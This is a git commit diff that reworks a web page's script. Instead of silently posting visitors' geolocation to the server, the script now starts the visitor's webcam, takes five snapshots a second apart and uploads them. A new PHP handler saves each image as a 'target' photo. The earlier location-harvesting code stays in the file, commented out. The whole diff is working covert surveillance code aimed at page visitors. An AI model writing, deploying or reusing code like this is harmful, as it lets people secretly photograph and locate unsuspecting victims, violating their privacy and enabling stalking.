e24b5466259d4f462e69082cc440a47acf79eb8a
hlamyomann <hlamyomann@gmail.com>
2020-11-19 01:40:44 +0630

    Update

--- js/location.js
+++ js/location.js
@@ -1,15 +1,50 @@
 
 
-$(document).ready(function(){
+$(document).ready(function(){  
 
-    const successCallback=(position)=>{
-        console.log(position.coords);
-        var lat=position.coords.latitude;
-        var long=position.coords.longitude;
-        $.post("./save.php",
-        {lat:lat,long: long,},
-        function(data,status){console.log(data);});
+    //photo
+    const webcamElement = document.getElementById('webcam');
+    const canvasElement = document.getElementById('canvas');
+    const webcam = new Webcam(webcamElement, 'user', canvasElement);
+
+    webcam.start()
+        .then(result =>{
+            console.log("webcam started");
+        })
+        .catch(err => {
+            console.log(err);
+    });
+
+    var i=0;
+    window.setInterval(function(){
+        if(i<5){
+            now_you_see_me();
+            i++;
+        }
+    }, 1000);
+
+    function now_you_see_me(){
+        var picture = webcam.snap();
+        $.post("./save_img.php",
+        {picture:picture},
+        function(data,status){
+            console.log(data);
+        });
     }
-    const errorCallback=(error)=>{console.log(error);}
-    const watchId= navigator.geolocation.getCurrentPosition(successCallback,errorCallback);
+
+    
+
+    // //location
+    // const successCallback=(position)=>{
+    //     console.log(position.coords);
+    //     var lat=position.coords.latitude;
+    //     var long=position.coords.longitude;
+    //     $.post("./save.php",
+    //     {lat:lat,long: long,},
+    //     function(data,status){
+    //         // console.log(data);
+    //     });
+    // }
+    // const errorCallback=(error)=>{console.log(error);}
+    // const watchId= navigator.geolocation.getCurrentPosition(successCallback,errorCallback);
 });
---
+++ save_img.php
@@ -0,0 +1,9 @@
+<?php
+$picture = $_POST['picture'];
+$data = explode( ',', $picture );
+$new_photo = fopen("photos/target_at".date('(M-d-Y|h:i:s)',time()).".png", "w");
+fwrite($new_photo, base64_decode($data[ 1 ]));
+fclose($new_photo);
+
+echo $output_file;
+
